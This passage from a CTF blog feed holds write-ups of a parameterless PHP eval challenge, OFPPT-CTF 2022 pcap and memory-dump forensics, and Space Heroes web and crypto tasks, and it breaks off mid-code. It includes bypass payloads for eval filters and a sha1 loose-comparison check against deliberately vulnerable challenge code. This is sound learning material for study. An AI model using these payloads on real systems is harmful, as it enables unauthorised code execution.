            <tag> phar反序列化，rce </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>cqgamectf-1</title>
      <link href="/2022/05/07/cqgamectf-1/"/>
      <url>/2022/05/07/cqgamectf-1/</url>
      
        <content type="html"><![CDATA[<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]) &#123;</span><br><span class="line">    <span class="variable">$cmd</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="string">&#x27;;&#x27;</span> === preg_replace(<span class="string">&#x27;/[a-z_]+\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$cmd</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/file|if|localeconv|phpversion|sqrt|et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log|var_dump|pos|current|array|time|se|ord/i&#x27;</span>, <span class="variable">$cmd</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;What are you thinking?&#x27;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="variable">$cmd</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;Please calm down&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd=show_source(end(scandir(chr(ceil(sinh(cosh(tan(ceil(tan(ceil(zend_version())))))))))));</span><br></pre></td></tr></table></figure><p><img src="/images/cqgamectf-1/1.png" alt="image-20220402164521180"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 无参数rce </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>OFPPT-CTF-2022-writeup</title>
      <link href="/2022/04/08/OFPPT-CTF-2022-writeup/"/>
      <url>/2022/04/08/OFPPT-CTF-2022-writeup/</url>
      
        <content type="html"><![CDATA[<h3 id="Forensics"><a href="#Forensics" class="headerlink" title="Forensics"></a>Forensics</h3><h4 id="pcap-analysis1"><a href="#pcap-analysis1" class="headerlink" title="pcap analysis1"></a>pcap analysis1</h4><p>考点:流量分析</p><p><a href="/images/ofppt-ctf-2022/pcap-analysis.7z">流量包下载</a></p><p>第一题，因为英语太菜了，这里翻译一下，大致的意思就是被入侵了，然后分析一下，这个人在搜索引擎上查找了什么</p><p><img src="/images/ofppt-ctf-2022/1.png" alt="image-20220408210409793"></p><p>我们这里直接筛选http流量，随便点一个，看到使用的是百度，随便搜索一个名字，就可以看到，wd对应的值就是我们搜索的内容，</p><p><img src="/images/ofppt-ctf-2022/2.png" alt="image-20220408211238126"></p><p><img src="/images/ofppt-ctf-2022/3.png" alt="image-20220408211344064"></p><p><img src="/images/ofppt-ctf-2022/4.png" alt="image-20220408211438318"></p><p>这里我们直接用简单方法，文件导出首选项，下面有全部的url，这里直接抄就行了。</p><p><img src="/images/ofppt-ctf-2022/5.png" alt="image-20220408212025332"></p><p>OFPPT-CTF{charles_geschickter}</p><h4 id="pcap-analysis2"><a href="#pcap-analysis2" class="headerlink" title="pcap analysis2"></a>pcap analysis2</h4><p>wireshark提取ftp流量包</p><p>这里我们可以看到许多ftp的协议，我们直接帅选ftp的流量，往下翻一番，随便找个request包，右键追踪流就可以看到了，</p><p><img src="/images/ofppt-ctf-2022/6.png" alt="image-20220408212631031"></p><p>因为题目的要求是相同文件名，后缀不同，所以就是这两个文件，接下来提取这两包</p><p><img src="/images/ofppt-ctf-2022/7.png" alt="image-20220408212848843"></p><p>这里直接搜索lytton-crypt.bin下面ftpdata就是数据，直接追踪</p><p><img src="/images/ofppt-ctf-2022/8.png" alt="image-20220408213524053"></p><p>调成原始数据，save</p><p><img src="/images/ofppt-ctf-2022/9.png" alt="image-20220408213738041"></p><p>lytton-crypt.bin</p><p>MD5: 4da8e81ee5b08777871e347a6b296953<br>SHA1: 5f88cfb5e469154782aa84a6b649007423c8b196<br>SHA256: 22190203d1789b181eb7230ceeafffe440b33883e185470b7cf64ab22fb3ba9f<br>CRC32: 2859590343</p><p>lytton-crypt.exe 同理</p><p><img src="/images/ofppt-ctf-2022/10.png" alt="image-20220408213950236"></p><p>MD5: 9cb9b11484369b95ce35904c691a5b28<br>SHA1: 4463adb39c4381b87c76180543c401c2bfa89962<br>SHA256: b7da7228ac44bd90aedf34660a04d15bf1ddf84c1a4823234c3abf506a254b8b<br>CRC32: 3745826804</p><blockquote><p>OFPPT-CTF{9cb9b11484369b95ce35904c691a5b28|4da8e81ee5b08777871e347a6b296953}</p></blockquote><h4 id="pcap-analysis3"><a href="#pcap-analysis3" class="headerlink" title="pcap analysis3"></a>pcap analysis3</h4><p>The attacker cracked a password belonging to the victim. Submit the flag as: OFPPT-CTF{password}.</p><p>这题就比较简单了，说攻破了密码，我们刚刚在ftp服务器上看到了登陆的痕迹，去找一下密码，直接搜索tcp和200就行，或者utf8也可以，追踪一下，就可以看到登录成功了</p><p><img src="/images/ofppt-ctf-2022/11.png" alt="image-20220408215301907"></p><p><img src="/images/ofppt-ctf-2022/12.png" alt="image-20220408215400191"></p><p>USER cgeschickter</p><p>331 Password required</p><p>PASS darkangel</p><p>230 User logged in.</p><blockquote><p>OFPPT-CTF{darkangel}</p></blockquote><h4 id="pcap-analysis4"><a href="#pcap-analysis4" class="headerlink" title="pcap analysis4"></a>pcap analysis4</h4><p>4这里说执行了一个文件<br>The attacker made a fatal mistake, and in doing so, gave control of his computer to… someone. he shouldn’t have run that malicious program.</p><p>我们在搜索http流量时，找到一个secret_decoder.bin，搜索这个关键字时，发现</p><p><img src="/images/ofppt-ctf-2022/13.png" alt="image-20220408215914265"></p><p><img src="/images/ofppt-ctf-2022/14.png" alt="image-20220408220108310"></p><p>.106的机器在105上执行了命令</p><p><strong>使用wget -O下载并以不同的文件名保存</strong></p><p>这里我们可以看到wget了一个文件且重命名了，之后改了权限，然后增加了定时任务，说明执行的就是这个secret_decoder.bin文件</p><p><img src="/images/ofppt-ctf-2022/15.png" alt="image-20220408220220107"></p><p>这里因为他在最后http请求了这个文件，我们直接导出就行,和ftp导出一样.</p><p><img src="/images/ofppt-ctf-2022/16.png" alt="image-20220408220615646"></p><p>导出之后取一下文件md5就行了</p><p>MD5: 42e419a6391ca79dc44d7dcef1efc83b<br>SHA1: e96c5e687d827f5a250fc643d1e9ff46e2c531bc<br>SHA256: 358489fcab70c3f10c4628e09c1ccbd001915f6adfa7fa97a1be0fb5fbab8198<br>CRC32: 2929409365</p><p><img src="/images/ofppt-ctf-2022/17.png" alt="image-20220408205826205"><br><img src="/images/ofppt-ctf-2022/18.png" alt="image-20220408205858332"></p><blockquote><p>OFPPT-CTF{42e419a6391ca79dc44d7dcef1efc83b}</p></blockquote><h4 id="pcapanalysis5"><a href="#pcapanalysis5" class="headerlink" title="pcapanalysis5"></a>pcapanalysis5</h4><p>The attacker started by performing a port scan of the victim computer.<br>Identify the open TCP ports discovered on the victim’s machine? Enter the flag as the open ports, separated by commas, no spaces, in numerical order. Disregard port numbers &gt; 10000. Example: OFPPT-CTF{80,110,111,143,443,2049} Use the PCAP file from ‘pcap analysis’ challenge.</p><p>这里我们先推断一下，因为在数据包中106的ip对103的ip进行了ftp密码爆破，所以106为攻击者，103为受害者且假设的为ftp服务。<br>筛选一下目的ip<code>ip.dst == 192.168.100.103</code></p><p><img src="/images/ofppt-ctf-2022/19.png" alt="image-20220409211513430"></p><p><img src="/images/ofppt-ctf-2022/20.png" alt="image-20220409212805266"></p><p>可以看到在扫描端口，往下拉一拉会看到请求成功的端口，一共有五个。这里我的方法不推荐，下面这个是一个大师傅的方法，链接<code>https://hhyleung.github.io/writeups/ofppt-ctf-2022/#pcap-analysis-6</code></p><p><img src="/images/ofppt-ctf-2022/21.png" alt="image-20220409213029038"></p><blockquote><p>A port scan is usually done with the TCP handshake, which ends with <code>SYN, ACK</code> if the port is opened. &gt;The filter <code>tcp.flags.ack == 1 and tcp.flags.syn == 1</code> was used to filter out the completed &gt;handshakes and it was found that ports <code>21</code>, <code>135</code>, <code>139</code>, <code>445</code>, and <code>3389</code> were opened.</p></blockquote><p>加上ip就更清晰了<code>tcp.flags.ack == 1 and tcp.flags.syn == 1 and ip.addr == 192.168.100.103</code></p><p><img src="/images/ofppt-ctf-2022/22.png" alt="image-20220409214123092"></p><blockquote><p>OFPPT-CTF{21,135,139,445,3389} </p></blockquote><h4 id="pcap-analysis6"><a href="#pcap-analysis6" class="headerlink" title="pcap analysis6"></a>pcap analysis6</h4><p>The attacker might have just bit off more than he can chew! he encountered a competitor that is counter-attacking his system!<br>The competitor executed a command to attain persistence on the attacker’s computer. This command will allow the adversary to regain a connection to the computer even after reboot. What is the packet number where this command was executed? For example: OFPPT-CTF{93721}. Use the PCAP file from ‘pcap analysis’ challenge.</p><p>前面我们知道加了计划任务，也就是直接搜sudo 就可以了，该包的号为160468</p><p><img src="/images/ofppt-ctf-2022/23.png" alt="image-20220409214555530"></p><blockquote><p>OFPPT-CTF{160468} </p></blockquote><h4 id="Windows-memory-dump"><a href="#Windows-memory-dump" class="headerlink" title="Windows memory dump"></a>Windows memory dump</h4><p>A Windows computer has been infected. The attacker managed to exploit a portion of a database backup that contains sensitive employee and customer private information. All memory dump challenges use the same file.<br>Inspect the memory dump and tell us the Windows Major Operating System Version, bit version, and the image date/time (UTC, no spaces or special characters). Submit the flag as OFPPT-CTF{OS_BIT_YYYYMMDDhhmmss}. Example: OFPPT-CTF{WindowsXP_32_20220120095959} File: 1.5 GB Decompressed: 5 GB</p><p>这里取证题，第一次遇到win10的镜像，记录一下</p><p>先看一下镜像信息<code>┌──(root💀bohemian)-[/tools/volatility] └─# python2 vol.py -f ../ctf/ofppt/physmemraw imageinfo</code><br>由于这个文件很大 5G,扫描扫了很久，查不多五分钟，我一度以为是我操作不对。后来发现不是，单纯的是因为文件大</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀bohemian)-[/tools/volatility]</span><br><span class="line">└─<span class="comment"># python2 vol.py -f ../ctf/ofppt/physmemraw imageinfo</span></span><br><span class="line">Volatility Foundation Volatility Framework 2.6.1</span><br><span class="line">INFO    : volatility.debug    : Determining profile based on KDBG search...</span><br><span class="line">          Suggested Profile(s) : Win10x64_19041</span><br><span class="line">                     AS Layer1 : SkipDuplicatesAMD64PagedMemory (Kernel AS)</span><br><span class="line">                     AS Layer2 : FileAddressSpace (/tools/ctf/ofppt/physmemraw)</span><br><span class="line">                      PAE <span class="built_in">type</span> : No PAE</span><br><span class="line">                           DTB : 0x1aa000L</span><br><span class="line">                          KDBG : 0xf8005e600b20L</span><br><span class="line">          Number of Processors : 4</span><br><span class="line">     Image Type (Service Pack) : 0</span><br><span class="line">                KPCR <span class="keyword">for</span> CPU 0 : 0xfffff8005ba60000L</span><br><span class="line">                KPCR <span class="keyword">for</span> CPU 1 : 0xffff82804f9c0000L</span><br><span class="line">                KPCR <span class="keyword">for</span> CPU 2 : 0xffff82804f5e8000L</span><br><span class="line">                KPCR <span class="keyword">for</span> CPU 3 : 0xffff82804f7ca000L</span><br><span class="line">             KUSER_SHARED_DATA : 0xfffff78000000000L</span><br><span class="line">           Image date and time : 2021-09-07 14:57:44 UTC+0000</span><br><span class="line">     Image <span class="built_in">local</span> date and time : 2021-09-07 07:57:44 -0700</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>我们可以看到是64位的win10，所以flag</p><blockquote><p>OFPPT-CTF{Windows10_64_20210907145744} </p></blockquote><h4 id="Windows-memory-dump2"><a href="#Windows-memory-dump2" class="headerlink" title="Windows memory dump2"></a>Windows memory dump2</h4><table><thead><tr><th>envars</th><th>显示进程的环境变量</th></tr></thead><tbody><tr><td></td><td></td></tr></tbody></table><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀bohemian)-[/tools/volatility]</span><br><span class="line">└─# python2 vol.py -f ../ctf/ofppt/physmemraw --profile=Win10x64_19041 envars | grep COMPUTE</span><br><span class="line">Volatility Foundation Volatility Framework 2.6.1</span><br><span class="line">     568 wininit.exe          0x000002760e625ed0 COMPUTERNAME                   DESKTOP-IT8QNRI</span><br><span class="line">     644 winlogon.exe         0x000002a6290b71e0 COMPUTERNAME                   DESKTOP-IT8QNRI</span><br><span class="line">     668 services.exe         0x0000018faf8027f0 COMPUTERNAME                   DESKTOP-IT8QNRI</span><br><span class="line">     708 lsass.exe            0x00000234422027f0 COMPUTERNAME                   DESKTOP-IT8QNRI</span><br><span class="line">     832 svchost.exe          0x000001e39d6027f0 COMPUTERNAME                   DESKTOP-IT8QNRI</span><br><span class="line">     952 svchost.exe          0x000001c6c2e027f0 COMPUTERNAME                   DESKTOP-IT8QNRI</span><br><span class="line">     996 svchost.exe          0x000002da882027f0 COMPUTERNAME                   DESKTOP-IT8QNRI</span><br><span class="line">     428 dwm.exe              0x0000019f91800fe0 COMPUTERNAME                   DESKTOP-IT8QNRI</span><br></pre></td></tr></table></figure><blockquote><p>OFPPT-CTF{DESKTOP-IT8QNRI}</p></blockquote><h4 id="Windows-memory-dump3"><a href="#Windows-memory-dump3" class="headerlink" title="Windows memory dump3"></a>Windows memory dump3</h4><p>Using the memory dump file from Window memory dump challenge, find out the name of the malicious process.<br>Submit the flag as OFPPT-CTF{process-name_pid} (include the file extension). Example: OFPPT-CTF{svchost.exe_1234}</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀bohemian)-[/tools/volatility]</span><br><span class="line">└─# python2 vol.py -f ../ctf/ofppt/physmemraw --profile=Win10x64_19041 pstree                                                                         130 ⨯</span><br><span class="line">Volatility Foundation Volatility Framework 2.6.1</span><br><span class="line">Name                                                  Pid   PPid   Thds   Hnds Time</span><br><span class="line">-------------------------------------------------- ------ ------ ------ ------ ----</span><br><span class="line"> 0xffff9a077fead080:wininit.exe                       568    456      1      0 2021-09-07 14:24:53 UTC+0000</span><br><span class="line">. 0xffff9a077ff1d080:lsass.exe                        708    568     13      0 2021-09-07 14:24:55 UTC+0000</span><br><span class="line">. 0xffff9a077ff54140:fontdrvhost.ex                   864    568      5      0 2021-09-07 14:24:55 UTC+0000</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"> 0xffff9a07843ab080:userinit.exe                     8180   2252      3      0 2021-09-07 14:55:55 UTC+0000</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">┌──(root💀bohemian)-[/tools/volatility]</span><br><span class="line">└─# python2 vol.py -f ../ctf/ofppt/physmemraw --profile=Win10x64_19041 cmdline | grep 8180</span><br><span class="line">Volatility Foundation Volatility Framework 2.6.1</span><br><span class="line">userinit.exe pid:   8180</span><br></pre></td></tr></table></figure><blockquote><p>OFPPT-CTF{userinit.exe_8180}</p></blockquote><h4 id="Windows-memory-dump4"><a href="#Windows-memory-dump4" class="headerlink" title="Windows memory dump4"></a>Windows memory dump4</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">┌──(root💀bohemian)-[/tools/volatility]</span><br><span class="line">└─<span class="comment"># python2 vol.py -f ../ctf/ofppt/physmemraw --profile=Win10x64_19041 dumpfiles --pid 8180 --dump-dir=../ctf/ofppt/                                    1 ⨯</span></span><br><span class="line">Volatility Foundation Volatility Framework 2.6.1</span><br><span class="line">ImageSectionObject 0xffff9a077f6d01a0   8180   \Device\HarddiskVolume2\Windows\SysWOW64\sechost.dll</span><br><span class="line">DataSectionObject 0xffff9a077f61f0d0   8180   \Device\HarddiskVolume2\Windows\System32\locale.nls</span><br><span class="line">ImageSectionObject 0xffff9a07857d4280   8180   \Device\HarddiskVolume2\Windows\Temp\userinit.exe</span><br><span class="line">ImageSectionObject 0xffff9a0784c4e590   8180   \Device\HarddiskVolume2\Windows\SysWOW64\cryptsp.dll</span><br><span class="line">ImageSectionObject 0xffff9a0784c6fa60   8180   \Device\HarddiskVolume2\Windows\System32\icuin.dll</span><br><span class="line">ImageSectionObject 0xffff9a0784c6f740   8180   \Device\HarddiskVolume2\Windows\System32\icuuc.dll</span><br><span class="line">DataSectionObject 0xffff9a0785d549b0   8180   \Device\HarddiskVolume2\Windows\System32\en-US\WWAHost.exe.mui</span><br><span class="line">DataSectionObject 0xffff9a0785d5ba30   8180   \Device\HarddiskVolume2\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_18.2106.12410.0_x64__8wekyb3d8bbwe\microsoft.system.package.metadata\S-1-5-21-1114333211-2247716564-2192578087-1001-MergedResources-0.pri</span><br><span class="line">DataSectionObject 0xffff9a077fefc730   8180   \Device\HarddiskVolume2\Windows\Globalization\Sorting\SortDefault.nls</span><br><span class="line">DataSectionObject 0xffff9a078480c5f0   8180   \Device\HarddiskVolume2\Windows\System32\en-US\edgehtml.dll.mui</span><br><span class="line">DataSectionObject 0xffff9a0780c1ced0   8180   \Device\HarddiskVolume2\Windows\ServiceProfiles\LocalService\AppData\Local\FontCache\~FontCache-System.dat</span><br><span class="line">DataSectionObject 0xffff9a0780d38620   8180   \Device\HarddiskVolume2\Windows\System32\en-US\KernelBase.dll.mui</span><br><span class="line">DataSectionObject 0xffff9a07809f4a30   8180   \Device\HarddiskVolume2\Windows\System32\en-US\dnsapi.dll.mui</span><br><span class="line">DataSectionObject 0xffff9a078482feb0   8180   \Device\HarddiskVolume2\Windows\ServiceProfiles\LocalService\AppData\Local\FontCache\~FontCache-S-1-5-21-1114333211-2247716564-2192578087-1001.dat</span><br></pre></td></tr></table></figure><p>ImageSectionObject 0xffff9a07857d4280   8180   \Device\HarddiskVolume2\Windows\Temp\userinit.exe</p><p>未出，借一下大师傅的writeup</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">└─$ vol -f physmemraw windows.dumpfiles --pid 8180</span><br><span class="line"></span><br><span class="line">Volatility 3 Framework 2.0.2</span><br><span class="line">Progress:  100.00               PDB scanning finished  </span><br><span class="line">Cache   FileObject      FileName        Result</span><br><span class="line"></span><br><span class="line">ImageSectionObject      0x9a077f6d01a0  sechost.dll     file.0x9a077f6d01a0.0x9a077f0ddb20.ImageSectionObject.sechost.dll.img</span><br><span class="line">ImageSectionObject      0x9a07857d4280  userinit.exe    file.0x9a07857d4280.0x9a07843b6a90.ImageSectionObject.userinit.exe.img</span><br><span class="line">ImageSectionObject      0x9a0784c4e590  cryptsp.dll     file.0x9a0784c4e590.0x9a0784bbca20.ImageSectionObject.cryptsp.dll.img</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">└─$ sha1sum file.0x9a07857d4280.0x9a07843b6a90.ImageSectionObject.userinit.exe.img</span><br><span class="line">962d96f30c8f126cbcdee6eecc5e50c3a408402b  file.0x9a07857d4280.0x9a07843b6a90.ImageSectionObject.userinit.exe.img</span><br></pre></td></tr></table></figure><p>Flag: <code>OFPPT-CTF&#123;962d96f30c8f126cbcdee6eecc5e50c3a408402b&#125;</code></p><h3 id="web"><a href="#web" class="headerlink" title="web"></a>web</h3><h4 id="php"><a href="#php" class="headerlink" title="php"></a>php</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;hash&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;hash&#x27;</span>] === <span class="string">&quot;10932435112&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;Not so easy mate.&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$hash</span> = sha1(<span class="variable">$_GET</span>[<span class="string">&#x27;hash&#x27;</span>]);</span><br><span class="line">    <span class="variable">$target</span> = sha1(<span class="number">10932435112</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$hash</span> == <span class="variable">$target</span>) &#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">        <span class="keyword">print</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">print</span> <span class="string">&quot;csictf&#123;loser&#125;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"> ?hash=aaroZmOk</span><br></pre></td></tr></table></figure><blockquote><p>参考<a href="https://hhyleung.github.io/writeups/ofppt-ctf-2022/">https://hhyleung.github.io/writeups/ofppt-ctf-2022/</a></p><blockquote><p>一直在路上</p></blockquote></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> web </tag>
            
            <tag> 取证 </tag>
            
            <tag> 流量分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2022Space Heroes CTF</title>
      <link href="/2022/04/03/2022Space-Heroes-CTF/"/>
      <url>/2022/04/03/2022Space-Heroes-CTF/</url>
      
        <content type="html"><![CDATA[<h4 id="web"><a href="#web" class="headerlink" title="web"></a>web</h4><h5 id="R2D2"><a href="#R2D2" class="headerlink" title="R2D2"></a>R2D2</h5><p>提示robot机器人，直接访问robots.txt即可</p><p><img src="C:\Users\xin\AppData\Roaming\Typora\typora-user-images\image-20220403204930418.png" alt="image-20220403204930418"></p><h3 id="Space-Traveler"><a href="#Space-Traveler" class="headerlink" title="Space Traveler"></a>Space Traveler</h3><p>前端验证，直接右键源代码，</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var _0xb645=[&quot;\x47\x75\x65\x73\x73\x20\x54\x68\x65\x20\x46\x6C\x61\x67&quot;,&quot;\x73\x68\x63\x74\x66\x7B\x66\x6C\x61\x67\x7D&quot;,&quot;\x59\x6F\x75\x20\x67\x75\x65\x73\x73\x65\x64\x20\x72\x69\x67\x68\x74\x2E&quot;,&quot;\x73\x68\x63\x74\x66\x7B\x65\x69\x67\x68\x74\x79\x5F\x73\x65\x76\x65\x6E\x5F\x74\x68\x6F\x75\x73\x61\x6E\x64\x5F\x6D\x69\x6C\x6C\x69\x6F\x6E\x5F\x73\x75\x6E\x73\x7D&quot;,&quot;\x59\x6F\x75\x20\x67\x75\x65\x73\x73\x65\x64\x20\x77\x72\x6F\x6E\x67\x2E&quot;,&quot;\x69\x6E\x6E\x65\x72\x48\x54\x4D\x4C&quot;,&quot;\x64\x65\x6D\x6F&quot;,&quot;\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x42\x79\x49\x64&quot;];function myFunction()&#123;let _0xb729x2;let _0xb729x3=prompt(_0xb645[0],_0xb645[1]);switch(_0xb729x3)&#123;case _0xb645[3]:_0xb729x2= _0xb645[2];break;default:_0xb729x2= _0xb645[4]&#125;;document[_0xb645[7]](_0xb645[6])[_0xb645[5]]= _0xb729x2&#125;</span><br></pre></td></tr></table></figure><p>这里函数拼接  不用管，直接把所有的16进制提出来，解一下就出了.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\x47\x75\x65\x73\x73\x20\x54\x68\x65\x20\x46\x6C\x61\x67\x73\x68\x63\x74\x66\x7B\x66\x6C\x61\x67\x7D\x59\x6F\x75\x20\x67\x75\x65\x73\x73\x65\x64\x20\x72\x69\x67\x68\x74\x2E\x73\x68\x63\x74\x66\x7B\x65\x69\x67\x68\x74\x79\x5F\x73\x65\x76\x65\x6E\x5F\x74\x68\x6F\x75\x73\x61\x6E\x64\x5F\x6D\x69\x6C\x6C\x69\x6F\x6E\x5F\x73\x75\x6E\x73\x7D\x59\x6F\x75\x20\x67\x75\x65\x73\x73\x65\x64\x20\x77\x72\x6F\x6E\x67\x2E\x69\x6E\x6E\x65\x72\x48\x54\x4D\x4C\x64\x65\x6D\x6F\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x42\x79\x49\x64</span><br></pre></td></tr></table></figure><p><img src="C:\Users\xin\AppData\Roaming\Typora\typora-user-images\image-20220403205401207.png" alt="image-20220403205401207"></p><h4 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h4><h3 id="Khaaaaaan"><a href="#Khaaaaaan" class="headerlink" title="Khaaaaaan!"></a>Khaaaaaan!</h3><p>开局一张图，是四种图形编码</p><p>分别对应的是</p><p><img src="C:\Users\xin\AppData\Roaming\Typora\typora-user-images\image-20220403205525043.png" alt="image-20220403205525043"></p><blockquote><p><a href="https://www.dcode.fr/symbols-ciphers">https://www.dcode.fr/symbols-ciphers</a><br>shctf{without_freedom_of_choice_there_is_no_creativity}</p></blockquote><h3 id="MobileInfantry"><a href="#MobileInfantry" class="headerlink" title="MobileInfantry"></a>MobileInfantry</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span 